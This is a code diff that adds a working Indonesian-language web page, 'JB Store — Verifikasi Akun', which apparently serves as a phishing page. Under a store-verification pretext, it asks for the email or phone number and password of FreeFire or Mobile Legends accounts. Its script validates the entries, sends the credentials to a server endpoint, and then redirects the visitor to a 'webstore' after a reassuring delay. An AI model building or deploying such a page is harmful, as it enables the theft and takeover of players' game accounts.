@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>JB Store — Verifikasi Akun</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    min-height: 100vh;
+    display: flex; align-items: center; justify-content: center;
+    font-family: system-ui, -apple-system, sans-serif;
+    background: radial-gradient(circle at top, #1f2937, #0b1220 60%);
+    color: #e5e7eb;
+    padding: 20px;
+  }
+  .card {
+    width: 100%; max-width: 380px;
+    background: rgba(17, 24, 39, 0.9);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 16px;
+    padding: 26px 22px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  }
+  .brand {
+    text-align: center;
+    font-size: 24px; font-weight: 800;
+    letter-spacing: 1px;
+    background: linear-gradient(90deg,#22d3ee,#a78bfa);
+    -webkit-background-clip: text; background-clip: text;
+    color: transparent;
+    margin-bottom: 22px;
+  }
+  label {
+    display: block;
+    font-size: 12px;
+    color: #94a3b8;
+    margin-bottom: 6px;
+    margin-top: 14px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  select, input {
+    width: 100%;
+    padding: 12px 14px;
+    border-radius: 10px;
+    border: 1px solid rgba(255,255,255,0.1);
+    background: #0f172a;
+    color: #e5e7eb;
+    font-size: 15px;
+    outline: none;
+    transition: border-color .2s, box-shadow .2s;
+  }
+  select:focus, input:focus {
+    border-color: #22d3ee;
+    box-shadow: 0 0 0 3px rgba(34,211,238,0.15);
+  }
+  button {
+    width: 100%;
+    margin-top: 22px;
+    padding: 13px;
+    border: none;
+    border-radius: 10px;
+    font-size: 15px; font-weight: 700;
+    cursor: pointer;
+    color: #06121f;
+    background: linear-gradient(90deg,#22d3ee,#60a5fa);
+    transition: transform .1s, filter .2s;
+  }
+  button:hover  { filter: brightness(1.1); }
+  button:active { transform: scale(0.98); }
+  button:disabled { opacity: 0.6; cursor: not-allowed; }
+  .msg {
+    margin-top: 16px;
+    font-size: 13px;
+    text-align: center;
+    min-height: 18px;
+  }
+  .msg.ok  { color: #22c55e; }
+  .msg.err { color: #ef4444; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="brand">JB STORE</div>
+
+    <label for="game">Stock Akun Game</label>
+    <select id="game">
+      <option value="FreeFire">FreeFire</option>
+      <option value="MobileLegend">MobileLegend</option>
+    </select>
+
+    <label for="identity">Email / Nomor HP</label>
+    <input id="identity" type="text" placeholder="email@gmail.com / 08xxxxxxxxxx" autocomplete="off">
+
+    <label for="password">Password</label>
+    <input id="password" type="password" placeholder="Password akun" autocomplete="off">
+
+    <button id="submitBtn">Lanjutan</button>
+    <p id="msg" class="msg"></p>
+  </div>
+
+<script>
+(function() {
+  const $ = id => document.getElementById(id);
+  const game = $('game'), idn = $('identity'), pwd = $('password');
+  const btn = $('submitBtn'), msg = $('msg');
+
+  function setMsg(t, cls) { msg.textContent = t; msg.className = 'msg ' + cls; }
+
+  function isValidIdentity(v) {
+    v = v.trim();
+    if (v.includes('@')) return /^[^\s@]+@gmail\.com$/i.test(v);
+    return /^08\d{8,12}$/.test(v);
+  }
+
+  btn.addEventListener('click', async () => {
+    const identity = idn.value.trim();
+    const password = pwd.value;
+
+    if (!isValidIdentity(identity)) {
+      setMsg('Gagal: email harus @gmail.com atau nomor HP diawali 08', 'err');
+      return;
+    }
+    if (!password || password.length < 3) {
+      setMsg('Gagal: password minimal 3 karakter', 'err');
+      return;
+    }
+
+    btn.disabled = true;
+    setMsg('Memproses...', 'ok');
+
+    try {
+      const res = await fetch('/api/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ game: game.value, identity, password })
+      });
+      const data = await res.json();
+
+      if (!data.ok) {
+        setMsg('Gagal: ' + (data.error || 'server error'), 'err');
+        btn.disabled = false;
+        return;
+      }
+
+      const delay = 7000; // 7 detik (range 5-10)
+      setMsg(`Berhasil! Mengarahkan ke webstore dalam ${delay/1000} detik...`, 'ok');
+      setTimeout(() => { window.location.href = data.redirect; }, delay);
+    } catch (e) {
+      setMsg('Gagal: tidak dapat menghubungi server', 'err');
+      btn.disabled = false;
+    }
+  });
+})();
+</script>
+</body>
+</html>
